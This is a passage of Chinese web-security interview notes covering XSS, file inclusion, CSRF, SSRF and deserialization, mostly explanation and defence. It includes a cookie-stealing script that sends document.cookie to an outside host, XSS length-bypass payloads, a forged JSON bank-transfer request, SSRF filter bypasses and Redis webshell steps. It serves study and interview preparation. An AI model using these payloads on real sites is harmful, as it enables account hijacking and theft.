start="2"><li>XSS的三种类型，防御方法。</li></ol><p>反射型：非持久性，参数型跨站脚本。发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务器解析后响应，XSS代码随响应内容一同传回浏览器，最后浏览器执行代码。<br>存储型：持久性跨站脚本，可写入数据库或文件等永久保存的介质中。<br>DOM型：文档对象模型（Document Object Model）是接口，允许程序或脚本动态的访问和更新。DOM型XSS是特殊的反射型XSS，也被称为本地跨站，基于DOM文档对象模型的一种漏洞。不需要服务器参与，触发靠浏览器解析。</p><p>防御方法：XSS防御  XSS防范<br>输入过滤：过滤掉HTML标签，JS代码，特殊字符等。<br>输出编码：对输出到页面的数据进行编码，以使其无法被浏览器执行。如将HTML进行HTML编码，JS进行js编码<br>使用过滤器：使用专业的XSS过滤器来检测和过滤恶意代码。<br>使用安全的编码规范：不将URL中使用用户输入的数据，不将用户输入直接插入到HTML标签中等。<br>执行内容安全策略：CSP限制页面在特定时间内加载的资源来减轻XSS的影响。这些资源可以包括可能损害客户端和服务器的脚本和图像。</p><ol start="3"><li>存储型XSS的原理和危害</li></ol><p>存储型XSS的原理：攻击者将恶意代码注入到服务器端数据库中，当用户访问包含恶意代码的页面时，恶意代码会被执行。<br>危害：可以多次攻击不同用户，窃取用户的账号和密码等信息，钓鱼，控制用户浏览器，传播恶意软件。</p><ol start="4"><li>你怎么理解XSS攻击？</li></ol><p>XSS攻击是一种跨站脚本攻击，是指攻击者将恶意代码注入到 Web 应用程序中，当用户访问该应用程序时，恶意代码会被执行。XSS攻击的危害性较大，可以窃取用户信息、控制用户浏览器、传播恶意软件等。</p><p>XSS攻击分为两种类型：<br>反射型 XSS：攻击者将恶意代码注入到 URL 中，当用户访问该 URL 时，恶意代码会被执行。<br>存储型 XSS：攻击者将恶意代码注入到服务器端数据库中，当用户访问包含恶意代码的页面时，恶意代码会被执行。</p><p>XSS攻击的防范方法主要有：<br>过滤用户输入的数据：对用户输入的数据进行过滤，去除其中的恶意字符和代码。<br>编码输出的数据：对输出到页面的数据进行编码，以使其无法被浏览器执行。<br>使用白名单：只允许特定的字符和代码通过，从而防止恶意代码通过。<br>使用过滤器：使用专业的 XSS 过滤器来检测和过滤恶意代码。</p><ol start="5"><li>如何快速发现XSS位置</li></ol><p>检查用户可控输入：XSS攻击通常需要利用用户可控输入，例如用户名，密码，评论，留言等。因此可以检查这些输入是否经过过滤和编码，如果没有，则可能存在XSS注入。<br>检查HTML输出：XSS攻击可以通过HTML输出来执行。检查输出是否包含敏感字符和代码，如 <code>&lt;script&gt;, &lt;iframe&gt;, &lt;img&gt;</code> 等。<br>使用XSS扫描工具：<a href="https://www.wangan.com/docs/owasp1">OWAZP ZAP</a><br>反射型：搜索栏处。</p><ol start="6"><li>DOM XSS 原理&#x2F;防范</li></ol><p>DOM XSS原理：攻击者在网站的留言板、评论区等地方提交恶意代码；网站将恶意代码输出到页面，但未进行编码；用户访问该页面时，恶意代码会被执行。DOM XSS的危害性较大，因为它可以绕过浏览器的安全机制，直接执行恶意代码。<br>防范：<br>在使用 <code>.innerHTML、.outerHTML、document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent、.setAttribute()</code> 等。<br>如果用 Vue&#x2F;React 技术栈，并且不使用 <code>v-html/dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML、outerHTML</code> 的 XSS 隐患。<br>DOM 中的内联事件监听器，如 <code>location、onclick、onerror、onload、onmouseover</code> 等， <code>&lt;a&gt;</code> 标签的 <code>href</code> 属性，JavaScript 的 <code>eval()、setTimeout()、setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p><ol start="7"><li>DOM型XSS与反射型XSS区别？</li></ol><p>DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，反射型XSS都属于服务端的安全漏洞。<br>攻击原理不同：DOM型XSS是通过修改或篡改页面的DOM结构，从而执行恶意脚本代码；反射型XSS是将恶意代码注入到URL中，当用户访问该URL时，恶意代码会被执行。<br>攻击效果不同：DOM型XSS的攻击效果更加隐蔽，更难以检测；反射型XSS的攻击效果相对较弱，比较容易被检测。<br>防范措施不同：DOM型XSS的防范措施包括使用白名单、过滤器、安全的编程规范等；反射型XSS的防范措施包括对用户输入的数据进行过滤和编码。</p><ol start="8"><li>如果SRC上报了一个XSS漏洞，payload已经写入页面，但未给出具体位置，如何快速介入？</li></ol><p>检查用户可控输入：可以使用Burp Suite等工具来模拟用户输入，并检查输出是否包含恶意代码。<br>检查HTML输出：可以使用Burp Suite等工具来检查HTML输出是否包含敏感字符和代码。<br>使用XSS扫描工具：可以使用OWASP ZAP、XSS Checker等工具来扫描网站，并检测XSS漏洞。</p><ol start="9"><li>XSS Worm 原理</li></ol><p>XSS Worm（跨站脚本蠕虫）是一种利用XSS漏洞进行传播的蠕虫。蠕虫会在受害者浏览器中执行恶意代码，并通过受害者浏览器访问其他网站，从而感染其他用户。</p><p>XSS Worm的攻击原理如下：<br>攻击者在网站的留言板、评论区等地方提交恶意代码。<br>网站将恶意代码输出到页面，但未进行编码。<br>用户访问该页面时，恶意代码会被执行。<br>恶意代码会在受害者浏览器中执行，并通过受害者浏览器访问其他网站。<br>恶意代码会在其他网站上传播，感染其他用户。</p><ol start="10"><li>有没有用过xss平台？</li></ol><p>在线平台：<a href="https://xssaq.com/login/">xssaq</a><br><a href="https://developer.aliyun.com/article/1168390">XSS平台搭建及利用</a></p><ol start="11"><li>xss如何执行代码</li></ol><p>反射型是将恶意代码注入到URL中，访问URL代码被执行。<br>存储型是将恶意代码注入到URL中，当用户访问包含恶意代码的页面时，恶意代码将会被执行。</p><ol start="12"><li>xss常用哪些标签？xss标签</li></ol><p>常用标签：<br><code>&lt;script&gt;, &lt;body&gt;, &lt;img&gt;, &lt;a&gt;, &lt;iframe&gt;, &lt;svg&gt;, &lt;input&gt;, &lt;video&gt;, &lt;style&gt; </code></p><ol start="13"><li>xss如何盗取cookie？xss如何获取cookie？</li></ol><p><code>&lt;script&gt;alert(&quot;document.cookie&quot;)&lt;/script&gt;</code><br>将以下代码封装成 <code>cookies.js</code> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://beauty.com/log?&quot;</span> + <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>实际从网页获取cookie代码： <code>&lt;script src = xx.com/cookies.js&gt;&lt;/script&gt;</code></p><ol start="14"><li>xss有cookie一定可以无用户名密码登录吗？</li></ol><p>不一定。有几个原因：<br>(1) cookie可能已过期<br>(2) 网站可能会使用双因素认证，比如token</p><ol start="15"><li>XSS除了获取cookie，还有别的用处吗?</li></ol><p>见问题1</p><ol start="16"><li>xss的危害，可能存在的地方？</li></ol><p>xss危害：见问题1<br>可能存在的地方：见问题5</p><ol start="17"><li>xss漏洞测试方法</li></ol><p>手动测试（相对准确，效率较低）：<br>识别可能存在 XSS 漏洞的输入字段。重点考虑数据输入的地方<br>尝试在输入字段中输入各种类型的恶意代码。比如 <code>&lt;, &gt;, ()</code> 等，提交后查看网页源代码的变化以发现输入被输出到什么地方<br>观察浏览器的响应，查看是否存在恶意代码被执行的情况。</p><p>自动测试：<br>选择合适的自动化工具。如：AVWS，BurpSuite，XSSer，XSSF，BeEF，beef-xss，XSStrike<br>配置自动化工具。<br>运行自动化工具。<br>分析自动化测试的结果，查看是否存在 XSS 漏洞。</p><ol start="18"><li>xss如何绕过安全防范</li></ol><p>使用Unicode编码：将字符转为unicode集，从而绕过过滤器。<br>使用混淆技术：混淆技术可以将恶意代码混淆，从而绕过过滤器。<br>使用漏洞利用工具：帮助攻击者自动化绕过安全防范措施。</p><ol start="19"><li>XSS form框限制长度的绕过？XSS限制长度，XSS长度限制<br>1、利用事件(Event)来缩短所需的字节数：<br><code>&quot; onclick=alert(1) //</code><br>实际输出: <code>&lt;input type=&quot;text&quot; value=&quot;&quot; onlick=alert(1) //&quot;/&gt;</code></li></ol><p>2、把XSS Payload写到别处，再通过简短的代码加载这段XSS Payload<br>常用的藏身处: <code>location.hash</code><br>hash属性是一个可读可写的字符串，该字符串是URL的锚部分（从#开始的部分）<br>实例：<br><code>&quot;onclick=&quot;eval(location.hash.sustr(1))</code><br>构造url: <code>http://ww.a.com/test.html#alert(1)</code><br>当用户点击 “location.hash”里的alert(1)就会执行了。</p><p>3、利用注释符绕过长度限制<br>比如我们能够控制两个文本框,  第二个文本框允许写入更多的字符。此时利用HTML的注释符号,  把两个文本框之间的HTML代码全部注释掉,  从而”打通” 两个input标签。<br>原HTML:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=1 type=&quot;text&quot; value=&quot;$var1&quot; /&gt;</span><br><span class="line">&lt;input id=2 type=&quot;text&quot; value=&quot;$var2&quot; /&gt;</span><br></pre></td></tr></table></figure><p>在第一个input框中输入:<br><code>&quot;&gt; &lt;!--</code><br>在第二个input框中输入：<br><code>--&gt; &lt;script&gt;alert(1)&lt;/script&gt;</code><br>最终的效果是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input id=1 type=&quot;text&quot; value=&quot;&quot;&gt; &lt;!-- /&gt;</span><br><span class="line">&lt;input id=2 type=&quot;text&quot; value=&quot;--&gt; &lt;script&gt;alert(1)&lt;/script&gt;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>4、尝试找一些特殊字符（或许可以从希腊字典中找到），能起到1个字符代替2个字符，或者绕过安全限制的效果。<br><code>&lt;script/src=//⑭.₨&gt;</code><br>解析时会变成: <code>14.rs</code></p><p><a href="https://blog.csdn.net/angry_program/article/details/104753335">XSS 绕过长度限制的一些小技巧</a><br><a href="https://nosec.org/home/detail/3206.html">在XSS测试中如何绕过字符长度限制</a></p><ol start="20"><li>XSS代码层防御xss防御<br>1、对用户输入和URL参数进行过滤，对输出进行编码<br>2、对用户所有提交内容进行验证，包括URL、查询关键字、HTTP头、POST数据等<br>3、仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交<br>4、在变量值输出到前端的HTML时进行编码和转义，对特殊字符进行过滤和转义<br>5、给关键的cookie使用http-only</li></ol><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ol><li>php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码，手工的话如何发掘？如果无本地报错回显，如何遍历文件？</li></ol><p>PHP本地包含漏洞原理：包含文件设置为变量，无过滤或过滤不严导致可调用恶意文件，还可以对远程文件包含。攻击者通过控制包含函数，如include(), require()等，加载服务器本地上的PHP脚本文件，配合任意文件上传漏洞，将恶意文件上传进服务器中，再通过本地文件包含执行该恶意脚本达到获得网站控制权的目的。<br>手工发掘文件包含漏洞：查找包含函数的使用，分析文件名是否来自用户输入，如果文件名未过滤可以尝试包含恶意文件。<br>存在漏洞却没有回显：有可能没显示在页面而是在源码中，可以利用DNSlog进行获取包含的信息。从index.php文件一级级读取。也可利用PHP封装协议读取文件。</p><ol start="2"><li>PHP和Java的文件包含区别</li></ol><p>PHP的文件包含：通常使用 <code>include</code> , <code>require</code> 两个函数实现。 <code>include</code> 函数包含文件不存在时会产生警告，但不会终止脚本的执行； <code>require</code> 函数在包含文件不存在时会产生致命错误，并终止脚本的执行。<br>PHP的文件包含功能可以包含任何文件。当包含PHP文件时，PHP解释器会将包含文件的代码解析并执行。因此，如果攻击者可以控制包含文件的内容，则可以利用文件包含漏洞来执行任意代码，从而获得系统权限。</p><p>Java的文件包含：Java的文件包含功能使用 <code>Class.getResource()</code> 来实现。 <code>Class.getResource()</code> 方法可以获取类路径下的资源文件，包括文件、图片、音频等。<br>Java的文件包含功能只能包含类路径下的资源文件。如果攻击者可以控制类路径下的资源文件，则可以利用文件包含漏洞来读取敏感信息，例如配置文件、源代码等。</p><p>区别：<br>PHP的文件包含更灵活，能包含任意文件；Java的文件包含只能包含类路径下的资源文件。<br>PHP的文件包含功能可以执行代码；Java的文件包含只能执行文件。<br>因此PHP的文件包含漏洞更严重。</p><ol start="3"><li>文件包含以及变量覆盖</li></ol><p>变量覆盖指的是可以用我们的传参值替换程序原有的变量值。<br>常见变量覆盖漏洞： <code>extract(), parse_str(), $$</code><br>变量覆盖实现方式：直接赋值，使用函数，使用运算符<br>变量覆盖可以用于实现不同的功能。，例如：改变变量的值，重置变量的值，删除变量的值。<br>如果攻击者可以控制传入的参数，则可以利用变量覆盖来修改程序的关键变量值，从而实现攻击目标。<br>常见变量覆盖漏洞：参数污染，注入攻击，缓冲区溢出<br>防止变量覆盖漏洞采取的措施：使用安全编码规范，对参数进行严格的验证，使用安全框架或安全工具。</p><ol start="4"><li>文件包含漏洞攻击原理及分类 文件包含漏洞原理 文件包含</li></ol><p>原理：文件包含函数加载的参数未经过过滤或严格的定义，可以被用户控制，包含其它恶意文件，导致执行非预期代码。<br>分类：远程文件包含（RFI），本地文件包含（LFI）</p><ol start="5"><li>如何快速挖掘包含漏洞</li></ol><p>可以使用自动化工具：OWASP ZAP，Burp Suite，W3AF<br>或者手动分析源代码：尝试使用别人已公布的nday，自行写脚本或用别人已写好的脚本；使用含糊测试，传入各种含糊数据；尝试包含各种类型文件，如html，css，js等；尝试包含目录中的文件，触发目录遍历漏洞；尝试包含系统文件，如配置文件、源代码等；尝试包含远程文件，以执行任意代码。</p><ol start="6"><li>包含漏洞具体能做什么，怎么绕过？</li></ol><p>具体能做：执行任意代码，读取敏感信息，影响应用程序正常执行。<br>绕过方式：<br>本地文件包含漏洞绕过: <code>%00</code> 截断，路径长度截断，点号截断，<br>远程文件包含漏洞绕过: 问号绕过，#号绕过，空格绕过</p><ol start="7"><li>导致文件包含的函数</li></ol><p>PHP：include(), include_once(), require(), require_once(), fopen(), readfile()<br>JSP&#x2F;Servlet: ava.io.File(), java.io.FileReader()<br>ASP: include file, include virtual</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><ol><li>CSRF如何不带referer访问</li></ol><p>(1) 使用空Referer头：将Referer头设置为空，这样请求就不会被拒绝。<br>(2) 使用其它协议：如 <code>ftp://  http://  file://  javascript:  data:</code></p><ol start="2"><li>CSRF成因及防御措施；如果不用token如何做防御？</li></ol><p>CSRF攻击的成因：<br>HTTP协议是无状态的：每个请求独立，与之前的请求无关。服务器无法追踪之前的请求来判断当前请求是否来自受信任的来源。<br>Web的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是否是用户批准发送的。<br>用户的浏览器会自动发送cookie：即使用户未意识到，浏览器也会发送cookie，从而泄露用户的身份信息。</p><ol start="3"><li>CSRF有何危害？</li></ol><p>执行任意操作：比如转账，修改密码，发布信息等<br>窃取敏感信息：如银行卡号，密码等<br>破坏网站功能：发送垃圾邮件，发布恶意内容等</p><ol start="4"><li>如何防止CSRF？</li></ol><p>(1) 阻止不明外域访问，采用同源策略 Samesite Cookie<br>(2) 使用token，分布式校验<br>(3) 使用双因素认证<br>(4) 使用安全框架或安全工具</p><ol start="5"><li>CSRF的原理及防御</li></ol><p>原理：CSRF攻击通常通过发送带有恶意请求的链接或表单来进行。当受害者点击链接或提交表单时，恶意请求就会被发送到目标网站。如果目标网站没有采取措施防止CSRF攻击，那么恶意请求就会被执行，并导致受害者执行攻击者的操作。<br>防御：见问题4</p><ol start="6"><li>一种特殊的CSRF场景：后端只解析json格式的时候如何利用CSRF（非更改Content-Type）</li></ol><p>利用XSS漏洞或DOM XSS，然后利用恶意代码来发送CSRF请求<br>利用JSON请求嵌入到一个HTML或CSS中，当访问该页面时，恶意的JSON请求就会发送到服务器。<br>首先需要获得受害者的cookie和token等需要验证身份的信息，然后构造一个JSON CSRF攻击(以银行体系为例)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /api/transfer <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: examplebank.<span class="property">com</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/json</span><br><span class="line"><span class="title class_">Cookie</span>: session_id=&lt;<span class="variable constant_">USER_SESSION_ID</span>&gt;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;token&quot;</span>: <span class="string">&quot;&lt;UI_TOKEN&gt;&quot;</span>,</span><br><span class="line">   <span class="string">&quot;to_account&quot;</span>: <span class="string">&quot;&lt;ATTACKER_ACCOUNT&gt;&quot;</span>,</span><br><span class="line">   <span class="string">&quot;amount&quot;</span>: <span class="string">&quot;-100000&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用js打fetch这类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com/post-data&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x-csrf-token&#x27;</span>: token <span class="comment">// 从上面获取到的 CSRF Token</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="comment">// POST 请求的数据</span></span><br><span class="line">    <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> <span class="comment">// 传递 cookies</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">body</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 处理响应</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="7"><li>SameSite</li></ol><p>SameSite是HTTP Cookie属性，用于限制cookie在跨站点请求中的传输，以防止web应用程序遭受CSRF攻击。SameSite属性可以设置为以下三个值：<br>None: Cookie可以跨站点传输，Lax: Cookie可以从同一域或同源子域发出的站点请求中跨站点传输。Strict: Cookie仅限于在同一域内的请求中传输。</p><ol start="8"><li>csrf攻击原理是什么，一般用什么工具进行检测</li></ol><p>原理：见问题5<br>探测工具：CSRF Tester, BurpSuite, OWASP CSRFGuard</p><ol start="9"><li>为什么token能防止CSRF攻击？token在请求包中的位置？<br>token 验证的规则是，服务器从请求体（POST）或者请求参数（GET）中获取设置的 token，然后和 Cookie 中的 token 进行比较，一致之后才执行请求。</li></ol><p>而 CSRF 攻击只是借用了 Cookie，并不能获取 Cookie 中的信息，所以不能获取 Cookie 中的 token，也就不能在发送请求时在 POST 或者 GET 中设置 token，把请求发送到服务器端时，token 验证不通过，也就不会处理请求了。</p><p>token在请求包中的session中。</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><ol><li>SSRF漏洞的成因 防御 绕过</li></ol><p>成因：服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。<br>防御：请求地址严格过滤，用正则表达式或黑名单。过滤放回信息。统一错误信息，避免攻击者可通过错误信息判断远程服务器端口的状态。限制请求的端口为http常用端口(如 80 443 8080 8090)。黑名单内网IP。禁用不需要的协议（仅允许http&#x2F;https）。使用隔离区，对外发起的请求放置在隔离区中进行严格的安全管控。内部系统使用代理来转发请求，防止攻击者直接访问目标地址。及时修复服务端漏洞，定期进行安全审计，关注安全动态。<br>绕过：<br>如果限制为 <code>http://www.xxx.com</code> 域名，使用绕过方式为 <code>http://www.xxx.com@www.xxc.com</code><br>如果限制请求IP不为内网地址，可采用绕过方式为：短地址，特殊域名，进制转换<br>如果限制请求只为http协议，可采用绕过方式为：采取302跳转，采取短地址<br>常用绕过方式：利用302跳转，进制转换，利用DNS解析，利用@绕过，利用[::]，添加端口号，利用短网址，其它各种指向127.0.0.1的地址，中文句号代替点号，利用IDN</p><ol start="2"><li>介绍SSRF漏洞，如何深入利用？如何探测非HTTP协议？如何防范？</li></ol><p>介绍SSRF漏洞：服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p><p>深入利用：获取敏感信息（如Redis未授权，MySQL未授权等），执行恶意操作（如上传文件，执行命令，修改数据等），控制外部系统（如web服务，数据库，文件系统等），进行攻击链（与RCE，数据库，文件上传，XSS等漏洞结合实现更大攻击效果）</p><p>探测非HTTP协议：<br>(1) 使用burpsuite的intruder，然后在payloads选择要使用的payload，在scope指定测试的url，在attack选择request method为post，在payload options处选择body data为gopher。<br>(2) 在dnslog创建一个新的域名，在服务端构造恶意请求，将url设置为dnslog的域名，在客户端发送恶意请求，如果服务器支持gopher协议则会向dnslog发送一个gopher协议的请求，dnslog会记录并将结果返回。</p><ol start="3"><li>SSRF利用点</li></ol><p>利用点：<br>内网服务（如Apache Hadoop远程命令执行，dict，docker API远程命令执行等）<br>Redis利用（如写ssh公钥，写crontab，写webshell，Windows启动项，主从复制加载.so文件，主从复制写无损文件）<br>云主机（通过访问云环境的元数据或管理API，部分情况下实现敏感信息等效果）<br>URL中：share, wap, url, link, src, source, target, u, 3g, display, sourceURI, ImageURL, domain,<br><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">SSRF利用点</a></p><ol start="4"><li>ssrf的原理即后利用，怎么执行命令，常搭配使用的协议。</li></ol><p>在 SSRF 漏洞的后利用中，常见的方法是利用内网开放端口执行命令。攻击者可以通过 SSRF 漏洞将请求发送到内网的服务器，并执行任意命令。例如，攻击者可以将请求发送到内网的 SSH 服务器，并通过 SSH 协议连接到目标站点，从而获得对目标站点的控制权。这种方法的优点是比较简单易行，不需要攻击者构造复杂的请求。缺点是需要目标站点有内网开放的端口。<br>常搭配使用的协议：gopher, dict, file, http&#x2F;s,</p><ol start="5"><li>ssrf漏洞攻击原理，用途</li></ol><p>原理：服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。<br>用途：SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><ol start="6"><li>说说如何挖掘ssrf漏洞</li></ol><p>挖掘：<br>首先查看常见场景：url地址进行网页分享，转码服务，图片加载与下载，未公开的api实现以及其它调用url的功能等<br>ssrf产生漏洞的函数： <code>file_get_contents(),  fsockopen(), curl_exec()</code></p><ol start="7"><li>SSRF对输入做了ipv4的正则过滤，有什么bypass方式？<br>1、DNS Rebinding绕过<br>2、IP双重绑定绕过</li></ol><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><ol><li>Java反序列化基础</li></ol><p>Java反序列化是将Java对象从字节流中恢复的过程。反序列化过程主要分为2步：<br>(1) 读取字节流，根据序列化规格提取对应的类<br>(2) 利用反射实例化获得对象</p><p>序列化对象的格式<br>Flag | data | flag | data</p><p>Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><p>对象能够成功的反序列化是因为和序列化的时候使用的协议是一样的，对应到Java反序列化中这里的协议指的就是serialVersionUID</p><p>Java反序列化漏洞是指在Java反序列化过程中，攻击者可以利用恶意对象的readObject方法来执行任意代码。Java反序列化漏洞通常出现在以下场景：<br>第三方库中存在漏洞<br>开发人员在开发过程中不小心导致了漏洞</p><p>利用方式主要有以下几种：<br>远程代码执行，恶意文件读取，任意文件写入</p><p>防范措施：<br>白名单机制，只允许反序列化特定的类<br>使用安全的序列化库<br>开发人员在开发过程中注意避免漏洞</p><ol start="2"><li>Java反序列化有哪些CC链是有回显的？</li></ol><p>Java反序列化CC链是指利用Java反序列化漏洞执行恶意代码的链条。cc链通常由多个类组成，每个类都负责执行特定的任务，最终达到执行恶意代码的目的。<br>有回显的CC链包括：<br>JNDI回显：利用JNDI服务将恶意代码执行结果输出到指定位置。<br>异常抛出回显：利用恶意代码抛出异常，并将异常信息输出到指定位置。<br>写文件回显：将恶意代码执行结果写入到指定文件中。<br>DNSlog回显：将恶意代码执行结果发送到指定的DNSlog服务器。</p><ol start="3"><li>Java反序列化相关的协议？</li></ol><p>Java Serialization Protocol: 将对象转换为字节流的协议。该协议定义了对象序列化过程中，需要保存对象的类名和类属性。<br>Externalizable Protocol: 将对象转换为字节流的协议。允许对象在序列化和反序列化过程中自定义序列化逻辑。</p><ol start="4"><li>Fastjson反序列化及如何修复？fastjson注入</li></ol><p>FastJson 是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象。<br>fastjson反序列化漏洞的利用方式主要有：利用类重写漏洞，利用链式反序列化漏洞，利用反序列化回显漏洞。<br>FastJson&lt;1.2.24:<br>JdbcRowSetlmpl类+JNDI(出网)<br>FastJsonBcel类+动态类加载(不出网)<br>FastJson&lt;&#x3D;1.2.47:</p><ol start="5"><li>Java反序列化的原理</li></ol><p>见问题1</p><ol start="6"><li>讲讲yso的链</li></ol><p>yso链是用于Java反序列化攻击的利用链。yso链是通过将多个Java类链接在一起，从而实现执行任意代码的目的。<br>yso链通常由以下几部分组成：<br>反序列化触发类：该类负责触发反序列化过程。<br>反序列化漏洞类：该类存在反序列化漏洞，攻击者可以利用该漏洞来执行任意代码。<br>执行代码类：该类负责执行攻击者指定的代码。</p><p>yso链的具体实现方法有：<br>CommonsCollections3链：该链利用Apache Commons Collection 3.1中的反序列化漏洞来执行任意代码。<br>fastjson链：该链利用FastJson中的反序列化漏洞来执行任意代码。<br>JNDI链：该链利用JNDI服务来执行任意代码。</p><p>可用来控制服务器，获取敏感信息，进行数据篡改等</p><p>防范措施：<br>升级JDK和第三方库到最新版本。<br>使用白名单机制：只允许反序列化特定的类和对象。<br>使用安全的网络协议：如HTTPS，避免使用HTTP<br>使用安全的web应用程序框架：如Spring Boot, Jetty等。</p><ol start="7"><li>shiro反序列化原理</li></ol><p>shiro版本：1.2.4<br>Apache Shiro框架提供了一个RememberMe的功能，这个功能在用户登陆成功后，会生成一个加密后的cookie，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段。其中记住我的RememberMe就是cookie中的key。cookie的值是对相关信息进行反序列化，再进行AES加密，再使用base64编码之后形成的。<br>服务端接收cookie值时，也是按以下步骤解析的：<br>检索RememberMe cookie的值，base64解码，再使用AES解码（加密密钥硬编码），最后进行反序列化操作（未作过滤处理）。</p><p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。<br>AES的密钥key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。<br>因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的RememberMe字段发送。Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p><p>Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。<br><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">Java反序列化Shiro篇01-Shiro550流程分析</a></p><ol start="8"><li>反序列化原理</li></ol><p>未对反序列化接口做访问控制，未对反序列化数据做加密和签名，加密密钥使用硬编码，使用不安全的反序列化框架库或函数的情况，由于反序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。</p><ol start="9"><li>PHP反序列化漏洞原理<br>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</li></ol><p>在反序列化的过程中自动触发了某些魔术方法。 而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><ol><li>命令注入有哪些</li></ol><p>代码层过滤不严造成的命令注入：如 <code>system(&quot;/bin/program --arg 